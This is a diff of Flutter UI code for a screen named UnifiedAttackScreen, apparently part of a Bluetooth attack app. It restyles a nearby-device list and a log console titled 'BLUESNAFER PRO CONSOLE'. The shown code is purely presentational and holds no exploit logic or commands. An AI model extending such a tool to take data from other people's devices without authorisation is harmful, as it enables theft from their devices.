+                            Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.w600, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
+                            const SizedBox(height: 3),
+                            Row(children: [
+                              Container(
+                                padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1),
+                                decoration: BoxDecoration(
+                                  color: devType == 'unknown' ? Colors.grey.withOpacity(0.15) : Colors.purpleAccent.withOpacity(0.12),
+                                  borderRadius: BorderRadius.circular(3),
+                                ),
+                                child: Text(devType == 'unknown' ? '?' : devType.toUpperCase(),
+                                  style: TextStyle(
+                                    color: devType == 'unknown' ? Colors.grey : Colors.purpleAccent,
+                                    fontSize: 8, fontWeight: FontWeight.bold)),
+                              ),
+                              const SizedBox(width: 6),
+                              Text(addr, style: const TextStyle(color: Colors.white24, fontSize: 8, fontFamily: 'monospace')),
+                              if (device['rssi'] != null) ...[
+                                const SizedBox(width: 6),
+                                Text('${device['rssi']}dBm', style: const TextStyle(color: Colors.white24, fontSize: 8)),
+                              ],
+                            ]),
+                          ])),
+                          if (isSelected) Container(
+                            padding: const EdgeInsets.all(4),
+                            decoration: BoxDecoration(color: Colors.greenAccent.withOpacity(0.15), borderRadius: BorderRadius.circular(10)),
+                            child: const Icon(Icons.check_circle, color: Colors.greenAccent, size: 16),
+                          ),
+                        ]),
+                      ),
+                    );
+                  },
+                ),
           ),
           _buildTerminalBar(),
         ],
@@ -3218,6 +3319,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       ),
     );
   }
+
 
   Widget _buildStepIndicator() {
     final step = _currentStep;
@@ -3333,24 +3435,22 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
   Widget _buildTerminalBar() {
     return Column(mainAxisSize: MainAxisSize.min, children: [
-      if (_isStatusExpanded)
+      if (true)
         Container(
-          height: 200, width: double.infinity, margin: const EdgeInsets.fromLTRB(16, 0, 16, 0), padding: const EdgeInsets.all(12),
-          decoration: const BoxDecoration(color: Color(0xFF0F172A), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
+          height: 280, width: double.infinity, margin: const EdgeInsets.fromLTRB(16, 0, 16, 0), padding: const EdgeInsets.all(12),
+          decoration: const BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
           child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-            const Row(children: [
-              Icon(Icons.terminal, color: Colors.cyanAccent, size: 14), 
-              SizedBox(width: 8), 
-              Text('CONSOLA DE SISTEMA', style: TextStyle(color: Colors.white24, fontSize: 10, fontWeight: FontWeight.bold))
+            Row(children: [
+              Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(color: Colors.cyanAccent.withOpacity(0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.cyanAccent.withOpacity(0.3), width: 1)), child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 12)),
+              const SizedBox(width: 8),
+              const Text('BLUESNAFER PRO CONSOLE', style: TextStyle(color: Colors.cyanAccent, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
+              const Spacer(),
+              IconButton(icon: const Icon(Icons.save_alt, color: Colors.blue, size: 16), onPressed: _exportLogs, tooltip: 'Exportar logs', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
+              const SizedBox(width: 8),
+              IconButton(icon: const Icon(Icons.delete_outline, color: Colors.redAccent, size: 16), onPressed: () { setState(() => _log = ['SISTEMA OPERATIVO - STANDBY']); }, tooltip: 'Limpiar consola', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
             ]),
-            IconButton(
-              icon: const Icon(Icons.save_alt, color: Colors.blue, size: 16),
-              onPressed: _exportLogs,
-              tooltip: 'Exportar logs a TXT',
-              padding: EdgeInsets.zero,
-              constraints: const BoxConstraints(),
-            ),
-            const Divider(color: Colors.white10),
+            const SizedBox(height: 4),
+            const Divider(color: Colors.white10, height: 1),
             Expanded(
               child: ListView.builder(
                 controller: _logScrollController,
@@ -3384,25 +3484,6 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
             
           ]),
         ),
-      GestureDetector(
-        onTap: () => setState(() => _isStatusExpanded = !_isStatusExpanded),
-        child: Container(
-          width: double.infinity, padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
-          decoration: BoxDecoration(color: const Color(0xFF0F172A), border: Border(top: BorderSide(color: Colors.white.withOpacity(0.05)))),
-          child: Row(children: [
-            Container(width: 8, height: 8, decoration: const BoxDecoration(color: Colors.greenAccent, shape: BoxShape.circle)),
-            const SizedBox(width: 12),
-            Expanded(child: Text(_log.isNotEmpty ? _log.last : 'STANDBY', style: const TextStyle(color: Colors.white70, fontSize: 11, fontWeight: FontWeight.w500), maxLines: 1, overflow: TextOverflow.ellipsis)),
-            Icon(_isStatusExpanded ? Icons.keyboard_arrow_down : Icons.keyboard_arrow_up, color: Colors.white24, size: 20),
-            const SizedBox(width: 4),
-            Container(
-              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
-              decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(8)),
-              child: Text('${_log.length}', style: const TextStyle(color: Colors.white38, fontSize: 9)),
-            ),
-          ]),
-        ),
-      ),
     ]);
   }
 
@@ -3433,11 +3514,17 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                 _saveState(); // Guardar selección
               },
               child: Card(margin: const EdgeInsets.only(bottom: 12), child: Padding(padding: const EdgeInsets.all(16), child: Row(children: [
-                Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: (isSelected ? Colors.indigoAccent : Colors.white).withOpacity(0.05), borderRadius: BorderRadius.circular(12)), child: Icon(device['isBeacon'] == true ? Icons.sensors : Icons.bluetooth, color: isSelected ? Colors.indigoAccent : Colors.white24, size: 24)),
+                Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: (isSelected ? Colors.indigoAccent : Colors.white).withOpacity(0.05), borderRadius: BorderRadius.circular(12)), child: Icon(_getDeviceIcon(device_utils.detectDeviceType(device)), color: isSelected ? Colors.indigoAccent : Colors.white54, size: 24)),
                 const SizedBox(width: 16),
                 Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-                  Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.bold, fontSize: 14)), 
-                  Text('$addr | ${device['rssi']} dBm', style: const TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'monospace'))
+                  Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
+                  const SizedBox(height: 4),
+                  Row(children: [
+                    Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.purpleAccent.withOpacity(0.15), borderRadius: BorderRadius.circular(4)), 
+                      child: Text(device_utils.detectDeviceType(device).toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontSize: 9, fontWeight: FontWeight.bold))),
+                    const SizedBox(width: 8),
+                    Text('$addr | ${device['rssi']} dBm', style: const TextStyle(color: Colors.white24, fontSize: 9, fontFamily: 'monospace')),
+                  ]),
                 ])),
                 if (isSelected) const Icon(Icons.check_circle, color: Colors.greenAccent, size: 20),
               ]))),
